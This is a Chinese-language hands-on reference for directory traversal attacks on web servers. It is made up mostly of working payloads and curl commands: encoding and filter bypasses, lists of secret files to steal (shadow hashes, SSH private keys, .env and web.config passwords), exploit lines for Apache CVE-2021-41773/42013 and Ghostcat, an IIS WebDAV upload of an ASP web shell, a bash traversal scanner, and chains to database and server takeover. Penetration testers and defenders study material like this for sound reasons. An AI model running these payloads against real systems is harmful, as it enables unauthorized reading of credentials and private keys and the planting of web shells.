# 目录遍历 (Directory Traversal) 实战参考

> 阶段分离: [攻击] 路径穿越检测+编码绕过 → [利用] 敏感文件读取/源码泄露/配置窃取
> 覆盖: 目录列表泄露 → 路径规范化绕过 → 编码绕过 → 绝对/相对路径穿越 → 各Web服务器特性

---

# 攻击阶段 — 检测与识别

## 1. 目录遍历 vs 文件包含 区别

```
目录遍历 (Directory Traversal / Path Traversal):
  → 读取文件内容 (不执行代码)
  → /etc/passwd, web.config, 源码文件
  → 本质: 文件读取漏洞

文件包含 (LFI / RFI):
  → 包含并执行文件中的代码
  → PHP伪协议, 日志投毒 → RCE
  → 本质: 代码执行漏洞

本参考专注目录遍历; LFI内容见 web-lfi-path.md
```

## 2. 快速检测

### 2.1 基础 Payload

```bash
# === Linux 路径穿越 ===
?file=../../../../etc/passwd
?file=../../../etc/passwd
?file=/etc/passwd                    # 绝对路径
?file=....//....//....//etc/passwd   # 序列化绕过
?file=..%2f..%2f..%2fetc%2fpasswd   # URL编码

# === Windows 路径穿越 ===
?file=..\..\..\..\windows\win.ini
?file=..%5c..%5c..%5cwindows%5cwin.ini
?file=C:\Windows\win.ini            # 绝对路径
?file=....\\....\\....\\windows\\win.ini

# === 参数名常见形式 ===
?file=       ?path=       ?document=
?download=   ?load=       ?read=
?template=   ?include=    ?page=
?dir=        ?folder=     ?src=
?filename=   ?f=          ?name=
```

### 2.2 确认性检测

```bash
# 确认1: 能读 /etc/passwd → 目录遍历确认
curl "https://target.com/download?file=../../../../etc/passwd"

# 确认2: 比较正常响应和异常响应
# 正常: ?file=profile.jpg → 200, 图片二进制
# 异常: ?file=../../../../etc/passwd → 200, 文本内容 → ★ 确认

# 确认3: 读取自身文件 (对比源码)
curl "https://target.com/download?file=download.php"
# → 读到了download.php源码 → 确认
```

---

## 3. 目录列表泄露 (Directory Listing)

### 3.1 Apache 目录列表检测

```bash
# === Apache 默认开启目录列表 (Options Indexes) ===
curl "https://target.com/uploads/"
curl "https://target.com/images/"
curl "https://target.com/assets/"
curl "https://target.com/backup/"

# 如果返回类似:
# <h1>Index of /uploads</h1>
# <ul><li>..</li><li>file1.jpg</li></ul>
# → ★ 目录列表启用

# === 常见泄露目录 ===
/admin/       /backup/     /uploads/
/images/     /css/        /js/
/logs/       /temp/       /tmp/
/config/     /includes/   /vendor/
/wp-content/  /static/     /assets/
/data/       /files/      /storage/
```

### 3.2 Nginx 目录列表检测

```bash
# Nginx 默认关闭 autoindex, 但如果开启:
curl "https://target.com/files/"
curl "https://target.com/static/"

# Nginx 目录页特征:
# <html><head><title>Index of /</title></head><body>
```

### 3.3 IIS 目录列表

```bash
# IIS 目录浏览开启时:
curl "https://target.com/images/"

# 返回特征:
# <pre><A HREF="/images/">[To Parent Directory]</A>
```

### 3.4 探测隐藏目录

```bash
# 目录列表关闭时, 用返回码判断:
# 200 → 目录存在且有默认页
# 403 → 目录存在但无默认页且列表关闭 → ★ 有价值
# 404 → 目录不存在

# 批量探测:
for dir in admin backup uploads logs config includes; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$dir/")
  echo "$dir → $code"
done
```

---

# 利用阶段 — 武器化

## 4. 路径穿越深度探测

### 4.1 确定路径深度

```bash
# === 从浅到深测试 ===
# 假设页面路径: /var/www/html/app/view.php

curl "https://target.com/view?file=../etc/passwd"            # 深度1
curl "https://target.com/view?file=../../etc/passwd"         # 深度2
curl "https://target.com/view?file=../../../etc/passwd"      # 深度3
curl "https://target.com/view?file=../../../../etc/passwd"   # 深度4
curl "https://target.com/view?file=../../../../../etc/passwd"# 深度5

# 哪个深度读到/etc/passwd → 确认深度N
# 一般 Web 根目录深度: 2-5层
```

### 4.2 常见 Web 根路径

```bash
# === Linux (Apache/Nginx) ===
/var/www/html/
/var/www/
/usr/share/nginx/html/
/usr/local/apache2/htdocs/
/opt/lampp/htdocs/
/home/*/public_html/

# === Linux (Tomcat) ===
/usr/local/tomcat/webapps/
/var/lib/tomcat/webapps/

# === Windows ===
C:\inetpub\wwwroot\
C:\xampp\htdocs\
C:\wamp64\www\
C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\
```

---

## 5. 敏感文件读取清单

### 5.1 Linux 高价值文件

```bash
# === 系统文件 ===
/etc/passwd              # 用户列表
/etc/shadow              # ★ 密码哈希 (需root)
/etc/group               # 组信息
/etc/hosts               # 内网映射
/etc/resolv.conf         # DNS配置
/etc/crontab             # 定时任务
/etc/fstab               # 挂载信息

# === SSH ===
/home/*/.ssh/id_rsa      # ★ 私钥
/home/*/.ssh/id_ed25519
/home/*/.ssh/authorized_keys
/home/*/.ssh/known_hosts  # 内网主机信息

# === Web 配置 ===
/var/www/html/.env       # ★ 数据库密码/API密钥
/var/www/html/.env.production
/var/www/html/config.php
/var/www/html/wp-config.php    # WordPress
/var/www/html/.htaccess        # Apache重写规则

# === 应用配置 ===
/etc/php/*/apache2/php.ini    # PHP配置
/etc/nginx/nginx.conf          # Nginx配置
/etc/apache2/apache2.conf      # Apache配置
/etc/mysql/my.cnf              # MySQL配置
/etc/redis/redis.conf          # Redis配置

# === 日志 ===
/var/log/apache2/access.log    # 可能含Token/URL
/var/log/nginx/access.log
/var/log/auth.log              # SSH登录历史
/var/log/syslog

# === 进程/内核 ===
/proc/self/environ             # 环境变量 (可能含密码)
/proc/self/cmdline             # 启动命令
/proc/1/cmdline                # PID 1 命令
/proc/version                  # 内核版本
```

### 5.2 Windows 高价值文件

```bash
# === 系统 ===
C:\Windows\win.ini           # 验证性读取
C:\Windows\System32\drivers\etc\hosts
C:\boot.ini                  # XP/2003

# === Web 服务器 ===
C:\inetpub\wwwroot\web.config          # ★ IIS配置 + 数据库密码
C:\xampp\htdocs\config.php
C:\xampp\passwords.txt                 # XAMPP默认密码!

# === 应用配置 ===
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
C:\Program Files\Apache Software Foundation\Tomcat\conf\server.xml
C:\Program Files\MySQL\MySQL Server 5.7\my.ini

# === 远程管理 ===
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\xampp\FileZillaFTP\FileZilla Server.xml

# === RDP/VNC ===
C:\Users\Administrator\AppData\Local\Microsoft\Windows\History\
C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\
```

### 5.3 Java/PHP 应用特定文件

```bash
# === Spring Boot ===
/WEB-INF/classes/application.properties   # ★ 数据库配置
/WEB-INF/classes/application.yml
/WEB-INF/web.xml                          # 应用配置
/WEB-INF/classes/db.properties

# === Struts2 ===
/WEB-INF/classes/struts.xml
/WEB-INF/struts-config.xml

# === PHP ===
/config/database.php
/config/database.yml
/application/config/database.php
/app/config/parameters.yml
```

---

## 6. 路径穿越绕过技术

### 6.1 编码绕过

```bash
# === URL 编码 ===
../     → %2e%2e%2f
..\     → %2e%2e%5c

# === 双重URL编码 ===
../     → %252e%252e%252f    (%25解码=%, 剩下%2e%2e%2f → ../)

# === 三重编码 (极少见) ===
../     → %25252e%25252e%25252f

# === Unicode 编码 ===
../     → ..%c0%af            # 宽字节截断
../     → ..%ef%bc%8f         # 全角斜线

# === UTF-8 变长编码 (IIS 特殊) ===
../     → %c0%ae%c0%ae%c0%af
../     → %c0%ae%c0%ae/      # 混合
```

### 6.2 序列化/规范化绕过

```bash
# === ....// 绕过 (过滤../后剩../) ===
# 过滤函数只去除一次 ../ → 巧妙构造
....//          → 去掉 ../ → ../
..././          → 去掉 ../ → ../
....\/          → 去掉 ..\ → ..\

# === 多次递归 ===
....//....//....//etc/passwd
..././..././..././etc/passwd

# === 通配符 (特殊场景) ===
..*/..*/..*/etc/passwd
```

### 6.3 绝对路径前缀绕过

```bash
# === 必须 /var/www/html/ 开头 ===
# 利用路径规范化:
/var/www/html/../../../../etc/passwd
/var/www/html/../../../etc/passwd

# Windows:
C:\inetpub\wwwroot\..\..\..\windows\win.ini

# === Tomcat /WEB-INF 路径保护 ===
# /WEB-INF/ 目录默认不可访问 → 路径穿越
..;/WEB-INF/web.xml        # Tomcat 路径参数
..%252fWEB-INF%252fweb.xml
```

### 6.4 后缀限制绕过

```bash
# === 必须 .php / .jpg 结尾 ===
# 空字节截断 (PHP <5.3.4):
?file=../../../../etc/passwd%00.jpg

# 路径规范化:
?file=../../../../etc/passwd/.              # 末尾加 /.
?file=../../../../etc/passwd/               # 末尾加 /
?file=../../../../etc/passwd/..              # 路径回退

# URL 锚点:
?file=../../../../etc/passwd%23.jpg         # # = %23, 截断

# 问号截断 (查询参数):
?file=../../../../etc/passwd?.jpg           # ? 后变为查询参数
```

### 6.5 关键字/敏感词过滤绕过

```bash
# === etc 被过滤 ===
?file=../../../../e\tc/passwd               # 反斜杠
?file=../../../../et%63/passwd              # URL编码 c
?file=../../../../ETC/passwd                # 大小写

# === passwd 被过滤 ===
?file=../../../../etc/passw%64              # URL编码 d
?file=../../../../etc/passwd.bak            # 备用文件

# === ../ 被完全过滤 ===
?file=/etc/passwd                           # ★ 绝对路径
?file=....//....//....//etc/passwd
?file=..%252f..%252f..%252fetc%252fpasswd   # 双重编码
```

---

## 7. Web 服务器特性利用

### 7.1 Apache 特性

```bash
# === Apache 路径规范化绕过 ===
# CVE-2021-41773 / CVE-2021-42013 (Apache 2.4.49/2.4.50)
curl --path-as-is "https://target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# === Tomcat AJP 幽灵猫 (CVE-2020-1938) ===
# AJP端口 (默认8009) 未授权访问 → 读取 WEB-INF 下文件
python3 ghostcat.py target.com

# === mod_jk 路径穿越 ===
# /jkstatus 管理页面泄露 + 路径穿越
```

### 7.2 Nginx 特性

```bash
# === Nginx 路径穿越 (alias配置错误) ===
# 配置: location /files/ { alias /var/www/uploads/; }
# 漏洞: /files../html/index.php → /var/www/uploads/../html/index.php
curl "https://target.com/files../html/index.php"

# === Nginx 空字节截断 (旧版 <0.8.41) ===
curl "https://target.com/file.php%00.txt"

# === Nginx 配置读取 ===
# 目录列表关闭但配置文件路径可猜:
curl "https://target.com/../etc/nginx/sites-enabled/default"
```

### 7.3 IIS 特性

```bash
# === IIS 分号截断 (IIS6 经典) ===
# /shell.asp;.jpg → 当ASP解析
# 也可用于路径穿越:
curl "https://target.com/download?file=..\..\windows\win.ini;.jpg"

# === IIS 短文件名 (8.3格式) ===
# web.config → web~1.con
curl "https://target.com/web~1.con"

# === IIS WebDAV (PUT+MOVE) ===
# 启用WebDAV的IIS → PUT上传 → MOVE穿越目录
curl -X PUT "https://target.com/shell.txt" -d "<%eval request(1)%>"
curl -X MOVE "https://target.com/shell.txt" -H "Destination: https://target.com/shell.asp"
```

### 7.4 其他框架特性

```bash
# === Spring Boot Actuator ===
# 路径穿越读取配置 (某些版本)
curl "https://target.com/actuator/..;/env"

# === Flask/Django ===
# Debug模式下可能泄露路径 + 源码
curl "https://target.com/console"           # Flask Werkzeug Console
# Django:
curl "https://target.com/..%2f..%2f..%2fetc/passwd"

# === Node.js Express ===
# 静态文件路径穿越
curl --path-as-is "https://target.com/static/../package.json"
curl --path-as-is "https://target.com/static/..%2f..%2fapp.js"
```

---

## 8. 自动化检测工具

### 8.1 手工自动化脚本

```bash
#!/bin/bash
# traverse.sh — 路径穿越自动化检测

TARGET="${1:?Usage: $0 <url_with_FILE_PARAM>}"
# e.g., ./traverse.sh "https://target.com/download?file=FILE"

# 敏感文件清单
FILES=(
  "/etc/passwd"
  "/etc/hosts"
  "/etc/hostname"
  "C:/Windows/win.ini"
  "/proc/self/environ"
  ".env"
  ".git/HEAD"
  "web.config"
  "WEB-INF/web.xml"
)

# 路径深度尝试
DEPTHS=(1 2 3 4 5 6)

for file in "${FILES[@]}"; do
  for depth in "${DEPTHS[@]}"; do
    # 构造 ../ 序列
    dots=$(printf '../%.0s' $(seq 1 $depth))
    payload="${dots}${file}"

    # URL编码
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")

    url="${TARGET/FILE/$encoded}"
    size=$(curl -s -o /dev/null -w "%{size_download}" "$url")

    if [ "$size" -gt 100 ]; then
      echo "[+] $url → $size bytes"
    fi
  done
done
```

### 8.2 专用工具

```bash
# === dotdotpwn (Perl) — 经典目录穿越Fuzzer ===
dotdotpwn.pl -m http -h target.com -M GET -x 8080 -f /etc/passwd \
  -k "root:" -b -q -d 5

# === dirsearch ===
python3 dirsearch.py -u "https://target.com/file?x=" --wordlist=traversal.txt

# === ffuf ===
ffuf -u "https://target.com/download?file=FUZZ" \
  -w traversal_payloads.txt -t 100
```

---

## 9. 实战技巧

### 9.1 响应分析判断成功

```bash
# Linux /etc/passwd → 包含 "root:" 
#   root:x:0:0:root:/root:/bin/bash → ★ 确认

# Windows win.ini → 包含 "[fonts]"
#   [fonts] → ★ 确认

# .env 文件 → 包含 "DB_PASSWORD="
#   DB_PASSWORD=secret123 → ★ 泄露

# 配置文件 → 包含 "<?php" 或 "<configuration>"
```

### 9.2 文件编码处理

```bash
# Base64 编码输出 (配合 PHP filter):
curl "https://target.com/view?file=php://filter/convert.base64-encode/resource=../../etc/passwd"
# 返回 base64 → 解码:
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==" | base64 -d

# 二进制文件 → hexdump 查看
curl -s "https://target.com/download?file=../../app.dll" | xxd | head -20
```

---

## 10. 漏洞链：目录遍历 → 升级利用

| 组合链 | 方式 | 结果 |
|--------|------|------|
| 目录遍历 → 日志读取 | 读access.log → 获取Token/Session | 会话劫持 |
| 目录遍历 → 源码读取 | 读.php/.java源码 → 审计 | 找其他漏洞 |
| 目录遍历 → 配置读取 | 读.env/web.config → 数据库密码 | 数据库接管 |
| 目录遍历 → SSH密钥 | 读id_rsa → SSH登录 | 服务器权限 |
| 目录遍历 → 审计源码 | 读控制器代码 → 发现隐藏API | 攻击面扩大 |
| 目录遍历 → LFI | 读到的源码含file inclusion | RCE |

---

*参考: OWASP Path Traversal + CWE-22/23/35/36 + 实战案例 + PayloadAllTheThings*
